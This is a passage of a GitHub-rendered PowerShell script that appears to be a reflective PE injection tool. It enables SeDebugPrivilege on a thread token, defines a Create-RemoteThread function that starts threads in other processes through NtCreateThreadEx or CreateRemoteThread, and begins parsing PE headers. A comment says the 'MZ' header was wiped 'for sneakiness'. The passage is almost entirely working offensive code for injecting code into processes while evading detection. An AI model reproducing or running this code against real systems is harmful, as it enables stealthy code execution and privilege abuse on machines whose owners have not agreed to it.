          <td id="L1093" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1093"></td>
          <td id="LC1093" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">else</span></td>
        </tr>
        <tr>
          <td id="L1094" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1094"></td>
          <td id="LC1094" class="blob-code blob-code-inner js-file-line">			{</td>
        </tr>
        <tr>
          <td id="L1095" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1095"></td>
          <td id="LC1095" class="blob-code blob-code-inner js-file-line">				<span class="pl-k">Throw</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Unable to OpenThreadToken. Error code: <span class="pl-smi">$ErrorCode</span><span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L1096" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1096"></td>
          <td id="LC1096" class="blob-code blob-code-inner js-file-line">			}</td>
        </tr>
        <tr>
          <td id="L1097" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1097"></td>
          <td id="LC1097" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L1098" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1098"></td>
          <td id="LC1098" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1099" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1099"></td>
          <td id="LC1099" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">IntPtr</span>]<span class="pl-smi">$PLuid</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::AllocHGlobal([<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::SizeOf([<span class="pl-k">Type</span>]<span class="pl-smi">$Win32Types<span class="pl-smi">.LUID</span></span>))</td>
        </tr>
        <tr>
          <td id="L1100" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1100"></td>
          <td id="LC1100" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Result</span> <span class="pl-k">=</span> <span class="pl-smi">$Win32Functions<span class="pl-smi">.LookupPrivilegeValue.Invoke</span></span>(<span class="pl-c1">$null</span><span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&quot;</span>SeDebugPrivilege<span class="pl-pds">&quot;</span></span><span class="pl-k">,</span> <span class="pl-smi">$PLuid</span>)</td>
        </tr>
        <tr>
          <td id="L1101" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1101"></td>
          <td id="LC1101" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">if</span> (<span class="pl-smi">$Result</span> <span class="pl-k">-eq</span> <span class="pl-c1">$false</span>)</td>
        </tr>
        <tr>
          <td id="L1102" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1102"></td>
          <td id="LC1102" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L1103" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1103"></td>
          <td id="LC1103" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">Throw</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Unable to call LookupPrivilegeValue<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L1104" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1104"></td>
          <td id="LC1104" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L1105" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1105"></td>
          <td id="LC1105" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L1106" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1106"></td>
          <td id="LC1106" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">UInt32</span>]<span class="pl-smi">$TokenPrivSize</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::SizeOf([<span class="pl-k">Type</span>]<span class="pl-smi">$Win32Types<span class="pl-smi">.TOKEN_PRIVILEGES</span></span>)</td>
        </tr>
        <tr>
          <td id="L1107" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1107"></td>
          <td id="LC1107" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">IntPtr</span>]<span class="pl-smi">$TokenPrivilegesMem</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::AllocHGlobal(<span class="pl-smi">$TokenPrivSize</span>)</td>
        </tr>
        <tr>
          <td id="L1108" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1108"></td>
          <td id="LC1108" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TokenPrivileges</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::PtrToStructure(<span class="pl-smi">$TokenPrivilegesMem</span><span class="pl-k">,</span> [<span class="pl-k">Type</span>]<span class="pl-smi">$Win32Types<span class="pl-smi">.TOKEN_PRIVILEGES</span></span>)</td>
        </tr>
        <tr>
          <td id="L1109" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1109"></td>
          <td id="LC1109" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TokenPrivileges<span class="pl-smi">.PrivilegeCount</span></span> <span class="pl-k">=</span> <span class="pl-c1">1</span></td>
        </tr>
        <tr>
          <td id="L1110" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1110"></td>
          <td id="LC1110" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TokenPrivileges<span class="pl-smi">.Privileges.Luid</span></span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::PtrToStructure(<span class="pl-smi">$PLuid</span><span class="pl-k">,</span> [<span class="pl-k">Type</span>]<span class="pl-smi">$Win32Types<span class="pl-smi">.LUID</span></span>)</td>
        </tr>
        <tr>
          <td id="L1111" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1111"></td>
          <td id="LC1111" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TokenPrivileges<span class="pl-smi">.Privileges.Attributes</span></span> <span class="pl-k">=</span> <span class="pl-smi">$Win32Constants<span class="pl-smi">.SE_PRIVILEGE_ENABLED</span></span></td>
        </tr>
        <tr>
          <td id="L1112" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1112"></td>
          <td id="LC1112" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::StructureToPtr(<span class="pl-smi">$TokenPrivileges</span><span class="pl-k">,</span> <span class="pl-smi">$TokenPrivilegesMem</span><span class="pl-k">,</span> <span class="pl-c1">$true</span>)</td>
        </tr>
        <tr>
          <td id="L1113" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1113"></td>
          <td id="LC1113" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L1114" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1114"></td>
          <td id="LC1114" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Result</span> <span class="pl-k">=</span> <span class="pl-smi">$Win32Functions<span class="pl-smi">.AdjustTokenPrivileges.Invoke</span></span>(<span class="pl-smi">$ThreadToken</span><span class="pl-k">,</span> <span class="pl-c1">$false</span><span class="pl-k">,</span> <span class="pl-smi">$TokenPrivilegesMem</span><span class="pl-k">,</span> <span class="pl-smi">$TokenPrivSize</span><span class="pl-k">,</span> [<span class="pl-k">IntPtr</span>]::Zero<span class="pl-k">,</span> [<span class="pl-k">IntPtr</span>]::Zero)</td>
        </tr>
        <tr>
          <td id="L1115" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1115"></td>
          <td id="LC1115" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$ErrorCode</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::GetLastWin32Error() <span class="pl-c"><span class="pl-c">#</span>Need this to get success value or failure value</span></td>
        </tr>
        <tr>
          <td id="L1116" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1116"></td>
          <td id="LC1116" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">if</span> ((<span class="pl-smi">$Result</span> <span class="pl-k">-eq</span> <span class="pl-c1">$false</span>) <span class="pl-k">-or</span> (<span class="pl-smi">$ErrorCode</span> <span class="pl-k">-ne</span> <span class="pl-c1">0</span>))</td>
        </tr>
        <tr>
          <td id="L1117" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1117"></td>
          <td id="LC1117" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L1118" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1118"></td>
          <td id="LC1118" class="blob-code blob-code-inner js-file-line">			<span class="pl-c"><span class="pl-c">#</span>Throw &quot;Unable to call AdjustTokenPrivileges. Return value: $Result, Errorcode: $ErrorCode&quot;   #todo need to detect if already set</span></td>
        </tr>
        <tr>
          <td id="L1119" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1119"></td>
          <td id="LC1119" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L1120" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1120"></td>
          <td id="LC1120" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1121" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1121"></td>
          <td id="LC1121" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::FreeHGlobal(<span class="pl-smi">$TokenPrivilegesMem</span>)</td>
        </tr>
        <tr>
          <td id="L1122" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1122"></td>
          <td id="LC1122" class="blob-code blob-code-inner js-file-line">	}</td>
        </tr>
        <tr>
          <td id="L1123" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1123"></td>
          <td id="LC1123" class="blob-code blob-code-inner js-file-line">	</td>
        </tr>
        <tr>
          <td id="L1124" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1124"></td>
          <td id="LC1124" class="blob-code blob-code-inner js-file-line">	</td>
        </tr>
        <tr>
          <td id="L1125" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1125"></td>
          <td id="LC1125" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">Function</span> <span class="pl-en">Create-RemoteThread</span></td>
        </tr>
        <tr>
          <td id="L1126" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1126"></td>
          <td id="LC1126" class="blob-code blob-code-inner js-file-line">	{</td>
        </tr>
        <tr>
          <td id="L1127" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1127"></td>
          <td id="LC1127" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">Param</span>(</td>
        </tr>
        <tr>
          <td id="L1128" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1128"></td>
          <td id="LC1128" class="blob-code blob-code-inner js-file-line">		[<span class="pl-c1">Parameter</span>(<span class="pl-v">Position</span> <span class="pl-k">=</span> <span class="pl-c1">1</span><span class="pl-k">,</span> <span class="pl-v">Mandatory</span> <span class="pl-k">=</span> <span class="pl-c1">$true</span>)]</td>
        </tr>
        <tr>
          <td id="L1129" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1129"></td>
          <td id="LC1129" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">IntPtr</span>]</td>
        </tr>
        <tr>
          <td id="L1130" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1130"></td>
          <td id="LC1130" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$ProcessHandle</span><span class="pl-k">,</span></td>
        </tr>
        <tr>
          <td id="L1131" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1131"></td>
          <td id="LC1131" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1132" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1132"></td>
          <td id="LC1132" class="blob-code blob-code-inner js-file-line">		[<span class="pl-c1">Parameter</span>(<span class="pl-v">Position</span> <span class="pl-k">=</span> <span class="pl-c1">2</span><span class="pl-k">,</span> <span class="pl-v">Mandatory</span> <span class="pl-k">=</span> <span class="pl-c1">$true</span>)]</td>
        </tr>
        <tr>
          <td id="L1133" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1133"></td>
          <td id="LC1133" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">IntPtr</span>]</td>
        </tr>
        <tr>
          <td id="L1134" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1134"></td>
          <td id="LC1134" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$StartAddress</span><span class="pl-k">,</span></td>
        </tr>
        <tr>
          <td id="L1135" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1135"></td>
          <td id="LC1135" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1136" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1136"></td>
          <td id="LC1136" class="blob-code blob-code-inner js-file-line">		[<span class="pl-c1">Parameter</span>(<span class="pl-v">Position</span> <span class="pl-k">=</span> <span class="pl-c1">3</span><span class="pl-k">,</span> <span class="pl-v">Mandatory</span> <span class="pl-k">=</span> <span class="pl-c1">$false</span>)]</td>
        </tr>
        <tr>
          <td id="L1137" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1137"></td>
          <td id="LC1137" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">IntPtr</span>]</td>
        </tr>
        <tr>
          <td id="L1138" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1138"></td>
          <td id="LC1138" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$ArgumentPtr</span> <span class="pl-k">=</span> [<span class="pl-k">IntPtr</span>]::Zero<span class="pl-k">,</span></td>
        </tr>
        <tr>
          <td id="L1139" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1139"></td>
          <td id="LC1139" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1140" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1140"></td>
          <td id="LC1140" class="blob-code blob-code-inner js-file-line">		[<span class="pl-c1">Parameter</span>(<span class="pl-v">Position</span> <span class="pl-k">=</span> <span class="pl-c1">4</span><span class="pl-k">,</span> <span class="pl-v">Mandatory</span> <span class="pl-k">=</span> <span class="pl-c1">$true</span>)]</td>
        </tr>
        <tr>
          <td id="L1141" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1141"></td>
          <td id="LC1141" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">System.Object</span>]</td>
        </tr>
        <tr>
          <td id="L1142" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1142"></td>
          <td id="LC1142" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Functions</span></td>
        </tr>
        <tr>
          <td id="L1143" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1143"></td>
          <td id="LC1143" class="blob-code blob-code-inner js-file-line">		)</td>
        </tr>
        <tr>
          <td id="L1144" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1144"></td>
          <td id="LC1144" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1145" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1145"></td>
          <td id="LC1145" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">IntPtr</span>]<span class="pl-smi">$RemoteThreadHandle</span> <span class="pl-k">=</span> [<span class="pl-k">IntPtr</span>]::Zero</td>
        </tr>
        <tr>
          <td id="L1146" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1146"></td>
          <td id="LC1146" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1147" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1147"></td>
          <td id="LC1147" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$OSVersion</span> <span class="pl-k">=</span> [<span class="pl-k">Environment</span>]::OSVersion.Version</td>
        </tr>
        <tr>
          <td id="L1148" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1148"></td>
          <td id="LC1148" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>Vista and Win7</span></td>
        </tr>
        <tr>
          <td id="L1149" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1149"></td>
          <td id="LC1149" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">if</span> ((<span class="pl-smi">$OSVersion</span> <span class="pl-k">-ge</span> (<span class="pl-c1">New-Object</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Version<span class="pl-pds">&#39;</span></span> <span class="pl-c1">6</span><span class="pl-k">,</span><span class="pl-c1">0</span>)) <span class="pl-k">-and</span> (<span class="pl-smi">$OSVersion</span> <span class="pl-k">-lt</span> (<span class="pl-c1">New-Object</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Version<span class="pl-pds">&#39;</span></span> <span class="pl-c1">6</span><span class="pl-k">,</span><span class="pl-c1">2</span>)))</td>
        </tr>
        <tr>
          <td id="L1150" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1150"></td>
          <td id="LC1150" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L1151" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1151"></td>
          <td id="LC1151" class="blob-code blob-code-inner js-file-line">			<span class="pl-c"><span class="pl-c">#</span>Write-Verbose &quot;Windows Vista/7 detected, using NtCreateThreadEx. Address of thread: $StartAddress&quot;</span></td>
        </tr>
        <tr>
          <td id="L1152" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1152"></td>
          <td id="LC1152" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$RetVal</span><span class="pl-k">=</span> <span class="pl-smi">$Win32Functions<span class="pl-smi">.NtCreateThreadEx.Invoke</span></span>([<span class="pl-k">Ref</span>]<span class="pl-smi">$RemoteThreadHandle</span><span class="pl-k">,</span> <span class="pl-c1">0x1FFFFF</span><span class="pl-k">,</span> [<span class="pl-k">IntPtr</span>]::Zero<span class="pl-k">,</span> <span class="pl-smi">$ProcessHandle</span><span class="pl-k">,</span> <span class="pl-smi">$StartAddress</span><span class="pl-k">,</span> <span class="pl-smi">$ArgumentPtr</span><span class="pl-k">,</span> <span class="pl-c1">$false</span><span class="pl-k">,</span> <span class="pl-c1">0</span><span class="pl-k">,</span> <span class="pl-c1">0xffff</span><span class="pl-k">,</span> <span class="pl-c1">0xffff</span><span class="pl-k">,</span> [<span class="pl-k">IntPtr</span>]::Zero)</td>
        </tr>
        <tr>
          <td id="L1153" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1153"></td>
          <td id="LC1153" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$LastError</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::GetLastWin32Error()</td>
        </tr>
        <tr>
          <td id="L1154" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1154"></td>
          <td id="LC1154" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">if</span> (<span class="pl-smi">$RemoteThreadHandle</span> <span class="pl-k">-eq</span> [<span class="pl-k">IntPtr</span>]::Zero)</td>
        </tr>
        <tr>
          <td id="L1155" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1155"></td>
          <td id="LC1155" class="blob-code blob-code-inner js-file-line">			{</td>
        </tr>
        <tr>
          <td id="L1156" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1156"></td>
          <td id="LC1156" class="blob-code blob-code-inner js-file-line">				<span class="pl-k">Throw</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Error in NtCreateThreadEx. Return value: <span class="pl-smi">$RetVal</span>. LastError: <span class="pl-smi">$LastError</span><span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L1157" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1157"></td>
          <td id="LC1157" class="blob-code blob-code-inner js-file-line">			}</td>
        </tr>
        <tr>
          <td id="L1158" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1158"></td>
          <td id="LC1158" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L1159" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1159"></td>
          <td id="LC1159" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>XP/Win8</span></td>
        </tr>
        <tr>
          <td id="L1160" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1160"></td>
          <td id="LC1160" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">else</span></td>
        </tr>
        <tr>
          <td id="L1161" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1161"></td>
          <td id="LC1161" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L1162" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1162"></td>
          <td id="LC1162" class="blob-code blob-code-inner js-file-line">			<span class="pl-c"><span class="pl-c">#</span>Write-Verbose &quot;Windows XP/8 detected, using CreateRemoteThread. Address of thread: $StartAddress&quot;</span></td>
        </tr>
        <tr>
          <td id="L1163" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1163"></td>
          <td id="LC1163" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$RemoteThreadHandle</span> <span class="pl-k">=</span> <span class="pl-smi">$Win32Functions<span class="pl-smi">.CreateRemoteThread.Invoke</span></span>(<span class="pl-smi">$ProcessHandle</span><span class="pl-k">,</span> [<span class="pl-k">IntPtr</span>]::Zero<span class="pl-k">,</span> [<span class="pl-k">UIntPtr</span>][<span class="pl-k">UInt64</span>]<span class="pl-c1">0xFFFF</span><span class="pl-k">,</span> <span class="pl-smi">$StartAddress</span><span class="pl-k">,</span> <span class="pl-smi">$ArgumentPtr</span><span class="pl-k">,</span> <span class="pl-c1">0</span><span class="pl-k">,</span> [<span class="pl-k">IntPtr</span>]::Zero)</td>
        </tr>
        <tr>
          <td id="L1164" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1164"></td>
          <td id="LC1164" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L1165" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1165"></td>
          <td id="LC1165" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1166" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1166"></td>
          <td id="LC1166" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">if</span> (<span class="pl-smi">$RemoteThreadHandle</span> <span class="pl-k">-eq</span> [<span class="pl-k">IntPtr</span>]::Zero)</td>
        </tr>
        <tr>
          <td id="L1167" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1167"></td>
          <td id="LC1167" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L1168" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1168"></td>
          <td id="LC1168" class="blob-code blob-code-inner js-file-line">			<span class="pl-c1">Write-Error</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Error creating remote thread, thread handle is null<span class="pl-pds">&quot;</span></span> <span class="pl-k">-</span>ErrorAction Stop</td>
        </tr>
        <tr>
          <td id="L1169" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1169"></td>
          <td id="LC1169" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L1170" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1170"></td>
          <td id="LC1170" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1171" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1171"></td>
          <td id="LC1171" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">return</span> <span class="pl-smi">$RemoteThreadHandle</span></td>
        </tr>
        <tr>
          <td id="L1172" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1172"></td>
          <td id="LC1172" class="blob-code blob-code-inner js-file-line">	}</td>
        </tr>
        <tr>
          <td id="L1173" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1173"></td>
          <td id="LC1173" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L1174" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1174"></td>
          <td id="LC1174" class="blob-code blob-code-inner js-file-line">	</td>
        </tr>
        <tr>
          <td id="L1175" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1175"></td>
          <td id="LC1175" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L1176" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1176"></td>
          <td id="LC1176" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">Function</span> <span class="pl-en">Get-ImageNtHeaders</span></td>
        </tr>
        <tr>
          <td id="L1177" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1177"></td>
          <td id="LC1177" class="blob-code blob-code-inner js-file-line">	{</td>
        </tr>
        <tr>
          <td id="L1178" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1178"></td>
          <td id="LC1178" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">Param</span>(</td>
        </tr>
        <tr>
          <td id="L1179" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1179"></td>
          <td id="LC1179" class="blob-code blob-code-inner js-file-line">		[<span class="pl-c1">Parameter</span>(<span class="pl-v">Position</span> <span class="pl-k">=</span> <span class="pl-c1">0</span><span class="pl-k">,</span> <span class="pl-v">Mandatory</span> <span class="pl-k">=</span> <span class="pl-c1">$true</span>)]</td>
        </tr>
        <tr>
          <td id="L1180" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1180"></td>
          <td id="LC1180" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">IntPtr</span>]</td>
        </tr>
        <tr>
          <td id="L1181" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1181"></td>
          <td id="LC1181" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$PEHandle</span><span class="pl-k">,</span></td>
        </tr>
        <tr>
          <td id="L1182" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1182"></td>
          <td id="LC1182" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1183" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1183"></td>
          <td id="LC1183" class="blob-code blob-code-inner js-file-line">		[<span class="pl-c1">Parameter</span>(<span class="pl-v">Position</span> <span class="pl-k">=</span> <span class="pl-c1">1</span><span class="pl-k">,</span> <span class="pl-v">Mandatory</span> <span class="pl-k">=</span> <span class="pl-c1">$true</span>)]</td>
        </tr>
        <tr>
          <td id="L1184" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1184"></td>
          <td id="LC1184" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">System.Object</span>]</td>
        </tr>
        <tr>
          <td id="L1185" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1185"></td>
          <td id="LC1185" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Types</span></td>
        </tr>
        <tr>
          <td id="L1186" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1186"></td>
          <td id="LC1186" class="blob-code blob-code-inner js-file-line">		)</td>
        </tr>
        <tr>
          <td id="L1187" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1187"></td>
          <td id="LC1187" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1188" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1188"></td>
          <td id="LC1188" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$NtHeadersInfo</span> <span class="pl-k">=</span> <span class="pl-c1">New-Object</span> System.Object</td>
        </tr>
        <tr>
          <td id="L1189" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1189"></td>
          <td id="LC1189" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1190" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1190"></td>
          <td id="LC1190" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>Normally would validate DOSHeader here, but we did it before this function was called and then destroyed &#39;MZ&#39; for sneakiness</span></td>
        </tr>
        <tr>
